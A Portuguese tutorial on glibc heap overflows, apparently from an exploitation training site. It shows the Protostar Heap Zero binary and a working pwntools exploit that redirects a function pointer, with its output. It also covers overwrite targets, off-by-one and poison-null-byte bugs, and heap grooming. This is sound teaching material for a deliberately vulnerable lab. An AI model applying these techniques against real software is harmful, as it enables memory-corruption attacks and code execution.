Heap Overflow é escrever além do tamanho de um chunk. Como os chunks são contíguos, os bytes excedentes caem sobre o **chunk seguinte**: primeiro o header dele (`prev_size`, `size`), depois os dados. Diferente da stack, não há endereço de retorno nem canary por perto: o que se ganha depende do que está no chunk vizinho.

Em uma heap sem chunks livres, cada `malloc` corta um pedaço do top chunk, então **chunks alocados em sequência ficam lado a lado, na ordem das alocações**. Havendo chunks livres nas bins, o `malloc` os reaproveita e a ordem na memória deixa de seguir a ordem das chamadas.

## Exemplo: Protostar Heap Zero

Binário do [Protostar](https://exploit.education/protostar/heap-zero/) (exploit.education), 32 bits:

```c
struct data { char name[64]; };
struct fp   { int (*fp)(); };

void winner()   { printf("level passed\n"); }
void nowinner() { printf("level has not been passed\n"); }

int main(int argc, char **argv)
{
  struct data *d = malloc(sizeof(struct data));
  struct fp   *f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);      // sem limite de tamanho
  f->fp();
}
```

Dois chunks alocados em sequência: `d` (64 bytes) e `f` (um ponteiro de função). O `strcpy` copia `argv[1]` para `d` sem limite, e em seguida o programa chama `f->fp`. O objetivo é fazer `f->fp` apontar para `winner`.

### Layout

```
pwndbg> x/x $ebp-0x1c          (f)

```

O `malloc(64)` gerou um chunk de `0x50` e não de `0x48`: nas glibc atuais o tamanho é múltiplo de 16 também em 32 bits. O `size` aparece como `0x51` por causa do bit `P`.

A distância entre os dois ponteiros é `0x0804b230 - 0x0804b1e0 = 0x50`. Esse é o padding.

### Exploit

```py
from pwn import *

elf = context.binary = ELF('./heap0')

payload = b'A' * 0x50 + p32(elf.sym['winner'])
p = elf.process(argv=[payload])
print(p.clean().decode('latin-1'))
```

```
data is at 0x99661e0, fp is at 0x9966230
level passed
```

Dois detalhes:

- O payload vai por `argv`, que é uma string C: não pode conter bytes nulos. O endereço `0x08048596` não tem nenhum, então passa.
- No caminho, o `strcpy` destruiu o header do chunk de `f` (`prev_size` e `size` viraram `AAAA`). Aqui não importa, porque o programa não chama `malloc` nem `free` depois. Em um programa que continua usando a heap, um header inválido aborta o processo (`free(): invalid size`, `malloc(): corrupted top size`...). Nesse caso, o payload precisa **reescrever o header com valores válidos**: `p32(0) + p32(0x11)` na posição certa.

## O que mais dá para sobrescrever

O exemplo ataca um ponteiro de função, que é o caso mais direto. Os alvos, em geral:

| Alvo no chunk vizinho | Resultado | Página |
|---|---|---|
| Ponteiro de função / vtable | Controle do fluxo | (exemplo acima) |
| Ponteiro para buffer (ex: `nota->conteudo`) | Leitura/escrita arbitrária quando o programa usar esse ponteiro | |
| Campo de tamanho ou flag (`len`, `is_admin`) | Overflow maior, bypass de checagens | |
| `fd` de um chunk **livre** no tcache/fastbin | `malloc` devolve endereço arbitrário | [Tcache Poisoning](./tcache.mdx#tcache-poisoning) |
| `size` de um chunk alocado | Chunks sobrepostos: ao ser liberado e realocado, ele cobre os vizinhos | |
| `prev_size` + bit `P` | Consolidação com um chunk falso | [Unlink](./unlink.mdx) |
| `size` do top chunk | `malloc` em endereço arbitrário (glibc < 2.29) | [House of Force](./malloc-maleficarum/house-of-force.mdx) |

### Off-by-one

Um overflow de **um único byte** já é explorável, por causa do compartilhamento do `prev_size`: quando o pedido usa o chunk até o último byte (`malloc(0x18)`, `malloc(0x28)`, ...), o byte seguinte aos dados é o byte menos significativo do `size` do vizinho.

- **Byte controlado**: aumentar o `size` do vizinho cria chunks sobrepostos.
- **Byte nulo** (*poison null byte*, o `\0` que `strcpy` e similares escrevem): zera o bit `P` do vizinho (e reduz o `size` dele, se o byte baixo não for `0x01`), fazendo o alocador acreditar que o chunk anterior está livre. É o ponto de partida de House of Einherjar.

Origens típicas: `for (i = 0; i <= n; i++)`, `buf[read(0, buf, n)] = 0`, `strncat`, `scanf("%Ns")` com `N` igual ao tamanho do buffer.

### Controlando quem é o vizinho

O overflow só serve se o chunk certo estiver logo depois do chunk vulnerável. Arrumar isso é o *heap grooming* (ou *feng shui*):

- Aloque o chunk vulnerável e a vítima em sequência, em uma heap "limpa".
- Ou abra um buraco: libere um chunk que fica logo **antes** da vítima e aloque o chunk vulnerável com o mesmo tamanho. Ele cai no buraco.
- Confira com `vis` no pwndbg antes de calcular offsets.
